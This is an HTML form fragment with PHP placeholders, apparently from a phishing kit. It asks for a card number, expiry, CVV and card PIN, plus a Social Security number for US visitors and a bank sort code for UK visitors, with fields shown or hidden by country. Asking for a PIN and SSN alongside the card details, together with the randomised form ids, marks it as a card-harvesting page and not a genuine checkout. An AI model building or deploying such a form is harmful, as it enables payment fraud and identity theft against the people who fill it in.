<form action="" method="post" accept-charset="utf-8" class="form" role="form" name="9liwaf" id="9liwaf">   
	<br/>
	<div class="row">
		<div class="form-group col-sm-6 col-md-4 col-lg-2" style="position: static;width: 375px;">
			<div class=" " >
			</div>
		</div>
		<div class=" col-md-6">
		<input id="9liwa-1" type="text" placeholder="xxx xxxx xxxx 1234"  maxlength="19" name="number" class="input-lg form-control cc-number unknown" required title="Please Enter Your Number">
	</div>
		<div class="col-xs-6 col-md-3">
			<input type="text" name="expiry" value="" class="form-control input-lg" placeholder="Exp Date"  id="9liwat-2" required/>
		</div>
		<div class="col-xs-6 col-md-3">
			<input type="text" name="cvc" value="" class="form-control input-lg" placeholder="CVV"  id="9liwat-3" required/>
		</div>
		<div class="col-xs-6 col-md-3">
			<input type="text" name="pin" value="" class="form-control input-lg" placeholder="PIN"  id="9liwat-3" required/>
		</div> 
		<div class="col-xs-6 col-md-6" style="display:<?=$us ?>;">
			<input type="text" name="9liwat-4" value="" class="form-control input-lg" placeholder="SSN" id="9liwat-4"  ng-model="ssn"   ssn-field="" ssn-field-mask="true"  />
		<input style="display:none;" value="<?=$countrycode ?>" id="countrycode" name="countrycode">
		</div>
		<div class="col-xs-6 col-md-6" style="display:<?=$uk ?>;">
			<input type="text" name="9liwat-5" value="" class="form-control input-lg" placeholder="Sort Code" id="9liwat-5" maxlength="8" />
		</div>
		<div class="col-xs-6 col-md-6">
			<input type="text" name="mobile-number" value="" class="form-control input-lg" placeholder="Phone number" id="mobile-number" />
		</div>
	</div>

	<div> 
		<button class="btn btn-lg btn-primary  mybotton" style="width:30%;font-size:100%;"type="button" name="button"id="button">Next</button>
	</div>

</form> 